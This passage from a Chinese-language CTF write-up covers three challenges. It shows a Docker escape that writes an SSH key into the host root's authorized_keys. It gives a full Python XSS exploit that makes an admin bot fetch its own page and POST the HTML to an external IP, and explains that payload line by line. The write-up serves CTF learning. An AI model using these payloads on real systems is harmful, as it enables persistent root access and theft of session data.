  "Cmd": ["/bin/sh", "-c", 
    "mkdir -p /host/root/.ssh && echo '你的公钥' >> /host/root/.ssh/authorized_keys && chmod 600 /host/root/.ssh/authorized_keys"],
  "HostConfig": {"Binds": ["/:/host"]}
}
```
然后直接
```
ssh -i 你的私钥 root@题目IP
```
这样就能拿到**真实的交互式 shell**，而不是通过 Docker 日志间接读输出，操作空间更大。
## SU_Note
这一题测试了一下，发现搜索界面有XSS漏洞，搜索`</script><script>alert(1)</script>`可以弹窗。
就是让bot去访问这个带有恶意payload的搜索框
脚本
```python
import requests, re, urllib.parse


EXTERNAL = "http://101.245.81.83:10003"
WEBHOOK  = "http://121.89.81.39:2333/"

s = requests.Session()

# 注册
reg_page = s.get(f"{EXTERNAL}/register.php")
csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', reg_page.text).group(1)
r = s.post(f"{EXTERNAL}/register.php", data={
    "_csrf": csrf,
    "username": "hacker666",
    "password": "hacker666",
}, allow_redirects=False)
print(f"[+] 注册状态码: {r.status_code}, Location: {r.headers.get('Location','无')}")
if r.status_code != 302:
    print("[-] 注册失败！")
    exit()

# 登录
login_page = s.get(f"{EXTERNAL}/login.php")
csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', login_page.text).group(1)
r = s.post(f"{EXTERNAL}/login.php", data={
    "_csrf": csrf,
    "action": "login",
    "username": "hacker666",
    "password": "hacker666",
}, allow_redirects=False)
print(f"[+] 登录状态码: {r.status_code}, Location: {r.headers.get('Location','无')}")
if r.headers.get('Location') != '/':
    print("[-] 登录失败！")
    exit()

# 跟随跳转到首页（让 session 里的 cookie 生效）
s.get(f"{EXTERNAL}/")
print("[+] 登录成功！")

# 获取 bot 页面
bot_page = s.get(f"{EXTERNAL}/bot/")
print(f"[+] Bot 页面状态码: {bot_page.status_code}, URL: {bot_page.url}")
if "login" in bot_page.url:
    print("[-] Bot 页面跳回登录，session 未生效！")
    exit()

csrf = re.search(r'name="_csrf"\s+value="([^"]+)"', bot_page.text).group(1)
print(f"[+] Bot CSRF: {csrf}")

# 构造 payload
# payload：抓首页找所有 note ID，逐个读取内容，全部 POST 到 webhook
js_payload = (
    '</script><script>'
    '(async()=>{'
    'const html=await fetch(`/`).then(r=>r.text());'
    f'fetch(`http://121.89.81.39:2333`,{{method:`POST`,body:html}});'
    '})();'
    '</script>'
)
target_url = f"http://127.0.0.1/search.php?q={urllib.parse.quote(js_payload, safe='')}"
print(f"[+] Target URL: {target_url}")

# POST 提交给 bot
r = s.post(f"{EXTERNAL}/bot/", data={
    "_csrf": csrf,
    "action": "visit",
    "url": target_url
}, allow_redirects=False)
print(f"[+] Bot POST 状态码: {r.status_code}")
print(f"[+] Bot POST 响应: {r.text[:300]}")

# GET 跟随（模拟浏览器行为）
r = s.get(f"{EXTERNAL}/bot/", params={"url": target_url})
print(f"[+] Bot GET 状态码: {r.status_code}")
print("[*] 去 requestrepo.com 等结果（约15秒）...")
```
这样可以在VPS上直接接收到bot的主页的html，里面就有flag 
这个脚本基本可以看懂，主要解释一下payload。
```js
(async () => { const html = await fetch(`/`).then(r => r.text()); fetch(`http://121.89.81.39:2333`, { method: `POST`, body: html }); })();
```
这里的`(async () => {...})();`包装了一个自动执行的函数。
```
const html = await fetch(`/`).then(r => r.text())
```
这个表示以受害者，也就是bot的身份去请求网站首页,浏览器会自动带上登录的Cookie。把返回结果转换成文字（HTML源码）。
`await` 表示等请求完成再继续。
把内容保存在html这个变量里。
```
fetch(`http://121.89.81.39:2333`, { method: `POST`, body: html });
```
把刚才请求到的`html`变量内容以POST方式发送到`http://121.89.81.39:2333`
## SU_Note_rev
这道题和上一题同一个解法。
